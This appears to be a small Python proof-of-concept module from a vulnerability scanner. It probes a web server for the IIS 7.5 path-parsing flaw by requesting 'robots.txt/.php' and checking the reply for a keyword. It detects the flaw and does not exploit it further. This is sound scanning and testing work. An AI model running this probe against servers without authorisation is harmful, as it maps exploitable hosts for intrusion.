# -*- coding: utf-8 -*-

import requests
from plugin.util import urlhandler, siteIndexTest
from lib.core.settings import HEADERS, TIMEOUT, VERIFY
from data.info_dict import IISPARSE_KEYWORD

def poc(url):
    testurl = urlhandler(url)
    if not siteIndexTest(testurl):
        return  # '[SiteRequestErr-iisparse] %s' % testurl

    payload = testurl + "robots.txt/.php"
    try:
        r = requests.get(payload, headers=HEADERS, timeout=TIMEOUT,
                         verify=VERIFY)
        if IISPARSE_KEYWORD in r.content:
            return '[iis7.5_parse] %s' % payload
        else:
            return False
    except Exception:
        return False
